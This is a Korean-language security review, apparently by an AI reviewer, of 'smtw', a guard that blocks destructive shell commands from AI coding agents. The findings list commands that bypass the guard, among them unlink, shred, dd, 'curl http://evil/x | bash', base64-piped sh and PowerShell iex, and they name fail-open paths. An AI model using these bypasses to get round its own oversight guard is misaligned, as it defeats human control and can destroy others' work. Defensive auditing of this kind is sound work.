# Qoder 하드리뷰 — smtw v2.7.1 (cb90ecb)

리뷰어: 우하 pane 독립 리뷰어(Qoder/Qwen3.8-Max). 좌하 Antigravity와 협의 없이 완전 독립 수행.
방법: `core/` 게이트 파서를 **직접 함수 호출**로 ~70개 적대 명령 실측, 어댑터 4종 게이트 호출부 대조,
CHANGELOG/README 주장과 코드 대조, 보안·핵심 테스트 450건 실행(전부 green). 저장소 코드 수정 없음.

## 종합 판정
- 점수: **62/100** (95 미만 — 미달)
- 치명 결함(Critical): **1건** — 0이 아니므로 **하드게이트 FAIL**

미달 사유(쉬운 말): 이 제품의 제일 가치는 "위험한 명령을 놓치지 않는 것(fail-closed)"입니다. 그런데
다른 에이전트의 파일을 지우는 명령을 막아주는 R2 안전문이, `rm`은 잡으면서 **거의 같은 동작의 `unlink`·
`shred`·`Clear-Content` 등은 "파괴 명령이 아닌 것"으로 판정해 그대로 통과**시킵니다. 한 단어만 바꾸면
안전문이 무력화됩니다. 게다가 같은 계열의 수리가 다른 어댑터 3개에는 다 들어가 있는데 **antigravity에만
빠져** 있습니다. 아키텍처·잠금·캐시는 잘 만들어져 있으나, 핵심 안전문의 탐지 어휘 구멍 하나로 가치가 훼손됩니다.

---
## Critical / High

### [C1] R2가 직접적 파일 삭제·절단 명령을 "파괴 아님"으로 판정해 우회 허용
- 위치: `core/destructive_guard.py:34`(REMOVE_COMMAND_NAMES), `:35`(TRUNCATE_COMMAND_NAMES),
  `:1259-1267`(_DETECTORS 목록), 허용 분기 `:1699-1701`
- 근거: R2는 탐지기가 아무 결과도 안 내면 `if not parsed_commands: return _allow("not destructive-shaped")`
  (`destructive_guard.py:1700-1701`)로 귀속(attribution) 검사 자체를 건너뛴다. REMOVE 집합은
  `{"rm","remove-item","del","rd","rmdir"}`뿐이어서, 파일을 지우는 표준 명령 대부분이 "파괴 형태 아님"으로 분류된다.
  이는 `README.ko.md:37-38`이 명시한 R2 약속("다른 에이전트의 미정산 변경이나 보호 상태를 지울 수 있는 파괴 작업을 막습니다")
  을 정면으로 위반한다. 아래 명령들은 인코딩·동적 코드가 아닌 **리터럴 경로의 정적 단일 명령**이라
  `README.ko.md:47`(arbitrary-code 우회 비보장)·`:50`(모든 문법 해석 비보장)의 비목표로도 면책되지 않는다.
  `rm f`는 잡으면서 문법이 동일한 `unlink f`를 놓치는 것은 "미지원 문법"이 아니라 **탐지 어휘 누락**이다.
- 재현/증거(직접 함수 호출, `evaluate_r2_destructive_gate` 종단 판정):
  - `unlink peer.py` → `allow` / `Clear-Content peer.py` → `allow` / `shred -u f`, `truncate -s 0 f`,
    `dd of=f if=/dev/zero`, `cp /dev/null f`, `mv f /dev/null`, PowerShell `ri f`, `Move-Item f ..`,
    `Copy-Item a b`, `[System.IO.File]::Delete('f')`, `[IO.File]::WriteAllText('f','')` → 전부 `ALLOW(no-parse)`
  - 대조(정상 동작): `rm f`, `Remove-Item f`, `del f` → `resolved:os_remove`(귀속 검사로 진입)
- 수리 방향: REMOVE/TRUNCATE 어휘를 표준 삭제·절단·덮어쓰기 명령으로 확장하고, 파일을 지우는 것이 자명한
  미등록 명령은 fail-closed로 처리.

### [H1] 셸이 파이프 표준입력으로 스크립트를 실행하면 우회 허용 (리다이렉션 형태는 차단 → 내부 모순)
- 위치: `core/destructive_guard.py:526-554`(_detect_wrapper_indirect), 특히 `:542-543`
  `if not payload_tokens: return None`
- 근거: 인자 없는 셸(`bash`/`sh`/`zsh`)이 명령 위치에 오면 payload가 비어 `None`을 반환해 파괴 판정에서 빠진다.
  그런데 **같은 "외부 스크립트 실행"인데 표준입력을 파일 리다이렉션으로 받으면 차단**한다. 즉 파서가
  "셸의 외부 스크립트 실행"을 위험 취급하도록 이미 설계돼 있으면서 파이프 형태만 빠뜨린 것으로, 의도된 범위라 보기 어렵다.
- 재현/증거: `bash < payload.sh` → `BLOCK:os_remove`, `sh -s < payload.sh` → `BLOCK:os_remove` 인 반면,
  `cat payload.sh | bash` → `ALLOW(no-parse)`, `curl http://evil/x | bash` → `ALLOW(no-parse)`,
  `echo cm0…|base64 -d|sh` → `ALLOW(no-parse)`. 의미상 동일 명령에 반대 판정.
  (비고: payload 내용이 임의 코드라 `README.ko.md:47` 비목표 경계에 걸치나, `<file` 차단/`|` 허용의 비대칭 자체가 구현 누락의 증거.)
- 수리 방향: 파이프의 수신 측(표준입력이 터미널이 아닌) 셸을 불투명 실행으로 취급해 fail-closed.

### [H2] PowerShell의 `eval`(`Invoke-Expression`/`iex`)이 불투명 래퍼 목록에 없어 최상위 호출이 우회 — CHANGELOG 주장과 모순
- 위치: `core/destructive_guard.py:76-86`(OPAQUE_WRAPPER_COMMAND_NAMES에 `invoke-expression`/`iex` 부재), 허용 분기 `:1700-1701`
- 근거: `eval`은 불투명 래퍼로 등록돼 있지만 PowerShell의 동일 기능인 `Invoke-Expression`/`iex`는 빠져 있다.
  `CHANGELOG.md:68-74`는 v2.7.0에서 "`Invoke-Expression`, `Clear-Content`, `Copy-Item`, `Move-Item`,
  `[IO.File]::WriteAllText` … 19건을 모두 차단, 30개 적대 주입 0 false negatives"라고 주장하나, 실측 결과 이는
  **`powershell -Command`로 감싼 경우에만** 참이다. 셸 자체가 PowerShell이라 최상위로 호출되면 전부 우회된다.
- 재현/증거: `iex 'Remove-Item f'` → `ALLOW(no-parse)`, `Invoke-Expression 'Remove-Item f'` → `ALLOW(no-parse)`.
  대조: `powershell -Command 'Remove-Item f'` → `BLOCK:parse_unable_wrapped`. 즉 문서가 "차단된다"고 한 명령이
  실제 가장 흔한 형태(최상위)에서는 차단되지 않는다(문서-코드 정합·테스트 갭 겸함).
- 수리 방향: `invoke-expression`/`iex`를 불투명 래퍼에 추가하고, 최상위(bare) PowerShell 파괴 명령 회귀 테스트 추가.

### [H3] antigravity 어댑터만 "복원된 신원 attribution 승격" 수리가 pre/post 양쪽에서 누락
- 위치: `adapters/antigravity/oma_hook.py:127`(pre_tool)·`:186`(post_tool)가 `invocation.scorecard_attribution`을 그대로 전달.
  대조: `adapters/claude_code/pre_tool_use.py:205-206`, `adapters/codex_cli/pre_tool_use.py:96-98`(CODEX-01)·
  `codex_cli/post_tool_use.py:52-54`(CODEX-02), `adapters/qwen_code/qwen_hook.py:247-249`(QWEN-01)·`:313-315`(QWEN-02)는
  전부 `if attribution=="legacy_default" and session_id!="default": attribution="exact"` 승격을 적용.
- 근거: antigravity도 `resolve_active_invocation`(`oma_hook.py:109`,`:176`)을 호출해 세션 복원이 실제로 일어나므로
  승격 누락의 영향이 현실화한다. 복원된 신원이 `legacy_default`에 머물면 ① R1이 유효한 namespaced 계약을
  미귀속 편집으로 오인(잘못된 차단/마찰), ② `record_contract_authored_event`가 `_is_exact_identity` 거짓으로
  조기 반환(`core/contract.py:706-707`)해 §6-5 계약 digest 감사 증거가 antigravity에서만 영구 미기록.
  이는 과제가 지목한 "한 어댑터에만 없는 수리" 계열(v2.7.1의 codex 캐시 누락과 동일한 패턴)이다.
- 재현/증거: 위 4개 어댑터 grep 대조로 승격 코드의 유무 확인(antigravity만 부재).
- 수리 방향: antigravity pre/post에 동일한 `legacy_default→exact` 승격 적용.

---
## Medium
- **[M1] git 히스토리·브랜치 파괴 미커버**: `git push --force`, `git push -f`, `git branch -D`, `git update-ref -d` → 전부 `ALLOW(no-parse)`.
  파일 pathspec 귀속 범위 밖이라 의도적 제외일 수 있으나, 파괴적임에도 비범위가 문서에 명시되지 않음. `core/destructive_guard.py:30-32`.
- **[M2] 소유자 잠금의 공정성·만료 판정 약점**: `core/file_lock.py:117-152` O_EXCL 스핀 잠금은 대기 순서(공정성) 보장이 없어
  경합 시 특정 waiter가 계속 질 수 있고, 만료 판정(`:89-104`)이 기록된 uuid 토큰은 무시하고 PID 생존만 본다 — PID 재사용 시
  죽은 잠금이 "살아있음"으로 오인돼 15s 타임아웃까지 대기할 수 있음.
- **[M3] R2 이전 단계 예외는 fail-open으로 빠져 R2 자체가 건너뛰어질 수 있음**: `canonical_invocation`/`tool_command` 등
  payload 파싱(`adapters/claude_code/pre_tool_use.py:151-159`)이 R2보다 먼저 실행되어 여기서 예외가 나면 광역 except(`:237`)→
  `fail_open`으로 R2가 한 번도 안 돈다. claude_code `fail_open`은 `warn_once`로 첫 회만 알리고 이후엔 `{}`만 출력
  (`adapters/claude_code/bootstrap.py:283-284`)해 반복 장애가 조용해짐("감독이 조용히 죽는" 표면).

## Low
- **[L1]** `chmod 000 f` 같은 권한·잠금 박탈 명령 미커버(파일 삭제는 아니나 접근 불가화).
- **[L2]** ledger 읽기 캐시 핑거프린트(`core/ledger.py:154-161`, mtime_ns+size)는 크로스프로세스 정합이 실측상 안전하나,
  같은 크기·같은 mtime_ns 창 내 두 번 쓰기는 이론적으로 앨리어싱 가능(NTFS/ext4 ns 클록에서 사실상 불가).
- **[L3]** 어댑터 테스트 실행 중 백그라운드 스레드에서 `UnicodeDecodeError: 'utf-8' … 0xc7`(cp949 한국어 출력을 utf-8로 읽은 양상)
  가 한 차례 관측됨. 구체 코드 경로로 격리하지는 못했으나, Windows 훅의 강건성/fail-open 유발 가능성으로 후속 조사 권장.

---
## 리뷰 커버리지 고백
**실제로 읽은 영역**
- 전문: `core/shell_command.py`, `core/destructive_guard.py`, `core/file_lock.py`, `adapters/claude_code/{pre_tool_use,bootstrap}.py`,
  `adapters/codex_cli/pre_tool_use.py`, `adapters/antigravity/oma_hook.py`, `adapters/qwen_code/qwen_hook.py`.
- 부분: `core/ledger.py`(1–500, 캐시·쓰기·이벤트), `core/contract.py`(R1·read-only 분기 655–839),
  `core/state_layout.py`(함수 목록·이중 트리 개요), CHANGELOG 선두, README/README.ko 주장 절.
- 실측: R2 파서·`is_proven_read_only_command`·`evaluate_r2_destructive_gate`에 적대 명령 ~70건 직접 호출(실행은 파서/함수 수준만, 파괴 명령 미실행).
  보안·핵심 테스트 450건 실행 전부 green(`test_friction_w3_opaque_whitelist` 등 4파일 298건 + 계약·어댑터·잠금·원자성 8파일 152건).

**못 본 / 깊게 보지 못한 영역(정직하게)**
- `core/provenance_*.py`(다수), `core/scorecard*` 내부, `core/ledger_v2.py` 귀속 로직 전문, `goals.py`, `quarantine.py` 내부,
  `smtw/` CLI 각 명령, 마이그레이션(`ledger_migration.py`), `scope_guard`·`classify`·`intent`.
- design 문서 전문, `build/`·`dist/`·`eval/`·`packs/`, `fable_lite/` shim 전문.
- 라이브 어댑터 subprocess 테스트는 시간이 길어 완주하지 못함(전체 스위트는 백그라운드에서 중단).
- **R1(계약 게이트) 우회는 R2만큼 깊게 파지 못함** — R2에 집중하느라 R1의 read-only 면제·namespaced 계약 검증 우회 시도는 제한적.
- 파서 예외 탈출(RecursionError 등)은 병적 입력으로 실측했으나 유발 사례를 찾지 못해 fail-open으로 단정하지 않음.

[QODER-REVIEW-DONE]
